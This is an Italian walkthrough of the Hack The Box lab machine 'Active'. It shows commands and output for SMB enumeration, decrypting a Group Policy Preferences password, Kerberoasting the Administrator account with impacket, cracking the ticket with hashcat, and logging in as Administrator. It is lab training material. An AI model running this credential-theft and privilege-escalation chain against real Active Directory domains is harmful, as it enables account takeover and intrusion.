---
title: Active Walkthrough
description: "Active è una macchina di difficoltà da easy a medium, che presenta due tecniche molto diffuse per ottenere privilegi all'interno di un ambiente Active Directory."
author: dua2z3rr
date: 2025-12-05 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Enterprise Network", "Area di Interesse: Vulnerability Assessment", "Area di Interesse: Active Directory", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Area di Interesse: Authentication", "Vulnerabilità: Default Credentials", "Vulnerabilità: Weak Permissions", "Vulnerabilità: Anonymous/Guest Access", "Servizio: SMB", "Servizio: Kerberos", "Tecnica: Reconnaissance", "Tecnica: Password Cracking", "Tecnica: Kerberoasting"]
image: /assets/img/active/active-resized.png
---

## Enumerazione Esterna

### nmap

Facciamo uno scan nmap.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.100 -vv -A
<SNIP>
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-12-05 11:35:32Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
49167/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.100 -vv -p53,88,135,139,389,445,464,593,636,3268,3269,49152-49158,49165,49167 -sC -sV
<SNIP>
PORT      STATE    SERVICE       REASON       VERSION
53/tcp    open     domain        syn-ack      Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec  syn-ack      Microsoft Windows Kerberos (server time: 2025-12-05 11:40:47Z)
135/tcp   open     msrpc         syn-ack      Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack      Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack
464/tcp   open     kpasswd5?     syn-ack
593/tcp   open     ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack
3268/tcp  open     ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack
49152/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49153/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49154/tcp filtered unknown       no-response
49155/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49156/tcp closed   unknown       conn-refused
49157/tcp open     ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49165/tcp open     msrpc         syn-ack      Microsoft Windows RPC
49167/tcp open     msrpc         syn-ack      Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-05T11:41:45
|_  start_date: 2025-12-05T11:20:16
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35056/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38631/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25865/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

### SMB

Enumeriamo gl shares di smb con smbmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

Abbiamo il permesso **READ ONLY** per lo share **Replication**. Scarichiamo tutti i file.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.10.100/Replication
Password for [WORKGROUP\dua2z3rr]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,1 KiloBytes/sec) (average 0,0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0,2 KiloBytes/sec) (average 0,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (6,7 KiloBytes/sec) (average 1,3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1,0 KiloBytes/sec) (average 1,2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3,2 KiloBytes/sec) (average 1,5 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (8,1 KiloBytes/sec) (average 2,3 KiloBytes/sec)
```

Lo share sembra una replica dello share di default **SYSVOL**, il quae contiene GPO (Group Policy Objects) ed è accessibile da tutti gli utenti autenticati. Leggiamo il file xml, il quale è l'unico leggibile.

```xml
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

All'interno di questo file troviamo la password criptata dell'utente **SVC_TGS**, il quale fa intendere che è un utente associato a kerberos (Ticket Granting Service).

### Decript

Cerando il tipo di hash con hashid, non otteniamo nulla. Dunque, dobbiamo ricercare come decriptarla.

Possiamo cercare come funziona la **Group Policy Password (GPP) encryption**.

Group Policy Preferences (GPP) è una funzionalità di Windows che consente agli amministratori di gestire le impostazioni su più macchine in un ambiente Active Directory (AD). Una delle sue funzionalità era quella di impostare password per account locali, che vengono memorizzate in file XML all'interno della directory SYSVOL.

- Tipo di Cifratura: Le password GPP sono cifrate utilizzando AES (Advanced Encryption Standard).
- Divulgazione della Chiave: La chiave di cifratura è pubblicamente nota, rendendo relativamente semplice per gli attaccanti decifrare le password.

Possiamo usare il tool **gpp-decrypt** di kali linux per decryptarla.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

La password dell'utente **SVC_TGS** è **GPPstillStandingStrong2k18**.

### SMB Autenticato

Ora che abbiamo delle credenziali, non possiamo connetterci in rdp o winrm poichè le porte non sono aperte. quindi, enumeriamo smb da autenticati.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY
```

Procedo a enumerare lo share users:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.10.100/Users -U SVC_TGS --password=GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018

		5217023 blocks of size 4096. 278537 blocks available
smb: \>
```

Prendo la user flag sul Desktop dell'utente **SVC_TGS**.

### Privilege Escalation

Enumeriamo gli utenti non disattivati sul dc tramite ldap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

Notiamo che oltre all'account che abbiamo compromesso è attivo anche l'account **Administrator**. Possiamo fare la stessa cosa in modo molto più semplice con **impacket-GetADUsers** tramite kerberos invece che LDAP.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 21:06:40.351723  2025-12-05 12:21:32.518169 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 20:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 22:14:38.402764  2018-07-21 16:01:30.320277
```

### Kerberoasting

Adesso applicheremo la tecnica del kerberoasting, che si basa sul ottenere l'hash tramite la **TGS_REP** di kerberos.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-12-05 12:21:32.518169
```

Con il comando sopra possiamo identificare gli utenti che sono sstati configurati con un **SPN** (Service Principal Names). Adesso richiediamo il **TGS**.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-12-05 12:21:32.518169             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$66394d303b9b04afc309ebc2424822a5$f9dd63dfc5569f21c06d690fe4859943c5ef81cb750d36fe4ea4516342d215cf19d10ac154889f85453d812045326aca15e03034885c550c5245bc107892e7b25429dde0b0a474f55e35b31f41330942baa12000b2c30471d2c4816d8a4f07d32f19e0abf179bc88f25e93fdb17f631da608bdde84a072dcfb5422722475234ccfd832020af966e2e2027b2a75ddb5efe5f928a9404ad8e73534bbb36b5aa8b45d55988571d05908e590458c366eb75fe36ad2d74f841db79e4d78ecfbb1b68d2bafa3b42c28fc39f26b48d4bca9cb16cd8610731c007393368a9a575de7d1806563c83ee67a3dd8eb0f0241c4a0691712a92a5576ddaabba531265e43d770a063f12fab95e3cfbdae2065ee58530d40c61e85ac3aa97884811dca9e07e5579a2cc294f347fa2c09d25f0643009711e111a9985daf8fa6ea9cbb5d2ffbc6955bbff7a1d099d6962e5f65ef9154458917ea7d018c8e8b1e652156cb05de65f579155b3d8f84e946a7a65a65c21fbc70f6ae8f2c6bafb80c7b55852773aba75703ccb0bd2c24ae607e858fe6392dbbc5d61c2286d1a9587ac594ec639aa68f54d575015a6a63ec2b542f87e583a870c3e951db66a575ad7b5ca3332713d4f3fe15c71605169ff2a30ca45c10945d261f4571213bf65aac7ba21ee2c1073626633e3ba4c6b6ece63cad1539d66a386159767afce08e8fd52072f00662cdba963968c39ea95c205b0851f5990a05d73fc173b2399e6b586bad5916e979cef93400f28c1be86b6b2c3bb34fb3a91d5c3c5ad99f09e3512101f29e3f00dd545c04ad9f830ba3d4403fc02d14a07a5ccd25e4522da0bcfb9102ff189af229da0e100a7eb024bd7152acff101b7fdbf3530c59143cc8ed20eda9f6c0c15fb44cb3b3381b825046830297cbf6f24a9c84647bae34b251a499380657ad02f129d81403200fd04a29a2a4e7608ccf22b15f32de6da734bccf5aaecf14e1716092ed953296ba87e26760fbc146fadf4700cf7aa48bdfd8408ec126fe144003ce32870081108e343b81c46c9dacc3c55c81680e3e565e421c2444894cce26cfa7862ba33e3407c89894dcf8a3d5305e4f71a1a46c44cb7a6b9e0ab6ae068f45a08c3d8a49959054541868afbc1963cc24aa12987cc413b77ec395da8998588492877f7bdc0d19b575fc3c022790012403fb95a17f0571c19c9d005c39a1fe12aa382c5f01c0f0d826620c348eb31735de4def17ee617260c0f72d57ee71ba9d3a
```

### hashcat

Inseriamo tutto il TGS nel file hash.txt e crackiamolo con hashcat.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -m 13100 hash.txt rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 4283/8630 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$66394d303b9b04afc309ebc2424822a5$f9dd63dfc5569f21c06d690fe4859943c5ef81cb750d36fe4ea4516342d215cf19d10ac154889f85453d812045326aca15e03034885c550c5245bc107892e7b25429dde0b0a474f55e35b31f41330942baa12000b2c30471d2c4816d8a4f07d32f19e0abf179bc88f25e93fdb17f631da608bdde84a072dcfb5422722475234ccfd832020af966e2e2027b2a75ddb5efe5f928a9404ad8e73534bbb36b5aa8b45d55988571d05908e590458c366eb75fe36ad2d74f841db79e4d78ecfbb1b68d2bafa3b42c28fc39f26b48d4bca9cb16cd8610731c007393368a9a575de7d1806563c83ee67a3dd8eb0f0241c4a0691712a92a5576ddaabba531265e43d770a063f12fab95e3cfbdae2065ee58530d40c61e85ac3aa97884811dca9e07e5579a2cc294f347fa2c09d25f0643009711e111a9985daf8fa6ea9cbb5d2ffbc6955bbff7a1d099d6962e5f65ef9154458917ea7d018c8e8b1e652156cb05de65f579155b3d8f84e946a7a65a65c21fbc70f6ae8f2c6bafb80c7b55852773aba75703ccb0bd2c24ae607e858fe6392dbbc5d61c2286d1a9587ac594ec639aa68f54d575015a6a63ec2b542f87e583a870c3e951db66a575ad7b5ca3332713d4f3fe15c71605169ff2a30ca45c10945d261f4571213bf65aac7ba21ee2c1073626633e3ba4c6b6ece63cad1539d66a386159767afce08e8fd52072f00662cdba963968c39ea95c205b0851f5990a05d73fc173b2399e6b586bad5916e979cef93400f28c1be86b6b2c3bb34fb3a91d5c3c5ad99f09e3512101f29e3f00dd545c04ad9f830ba3d4403fc02d14a07a5ccd25e4522da0bcfb9102ff189af229da0e100a7eb024bd7152acff101b7fdbf3530c59143cc8ed20eda9f6c0c15fb44cb3b3381b825046830297cbf6f24a9c84647bae34b251a499380657ad02f129d81403200fd04a29a2a4e7608ccf22b15f32de6da734bccf5aaecf14e1716092ed953296ba87e26760fbc146fadf4700cf7aa48bdfd8408ec126fe144003ce32870081108e343b81c46c9dacc3c55c81680e3e565e421c2444894cce26cfa7862ba33e3407c89894dcf8a3d5305e4f71a1a46c44cb7a6b9e0ab6ae068f45a08c3d8a49959054541868afbc1963cc24aa12987cc413b77ec395da8998588492877f7bdc0d19b575fc3c022790012403fb95a17f0571c19c9d005c39a1fe12aa382c5f01c0f0d826620c348eb31735de4def17ee617260c0f72d57ee71ba9d3a:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...ba9d3a
Time.Started.....: Fri Dec  5 17:41:53 2025 (13 secs)
Time.Estimated...: Fri Dec  5 17:42:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   849.7 kH/s (2.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tioncurtis23 -> Teague51
Hardware.Mon.#1..: Util: 25%

Started: Fri Dec  5 17:41:30 2025
Stopped: Fri Dec  5 17:42:08 2025
```

La password dell'account **Administrator** è **Ticketmaster1968**.

### SMB come Administrator

Prendiamo la root flag su smb e terminiamo la box.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.10.100/C$ -U Administrator --password=Ticketmaster1968
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Tue Jul 14 04:34:39 2009
  Documents and Settings          DHSrn        0  Tue Jul 14 07:06:44 2009
  pagefile.sys                      AHS 5041647616  Fri Dec  5 12:20:02 2025
  PerfLogs                            D        0  Tue Jul 14 05:20:08 2009
  Program Files                      DR        0  Wed Jan 12 14:11:58 2022
  Program Files (x86)                DR        0  Thu Jan 21 17:49:16 2021
  ProgramData                       DHn        0  Wed Jan 12 14:09:27 2022
  Recovery                         DHSn        0  Mon Jul 16 12:13:22 2018
  System Volume Information         DHS        0  Wed Jul 18 20:45:01 2018
  Users                              DR        0  Sat Jul 21 16:39:20 2018
  Windows                             D        0  Fri Dec  5 13:08:40 2025

		5217023 blocks of size 4096. 278137 blocks available
smb: \> cd Users
smb: \Users\> cd Administrator\
smb: \Users\Administrator\> cd Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 17:49:47 2021
  ..                                 DR        0  Thu Jan 21 17:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 15:50:10 2018
  root.txt                           AR       34  Fri Dec  5 12:21:30 2025

		5217023 blocks of size 4096. 278137 blocks available
smb: \Users\Administrator\Desktop\> more root.txt 
getting file \Users\Administrator\Desktop\root.txt of size 34 as /tmp/smbmore.qVPYtJ (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
```
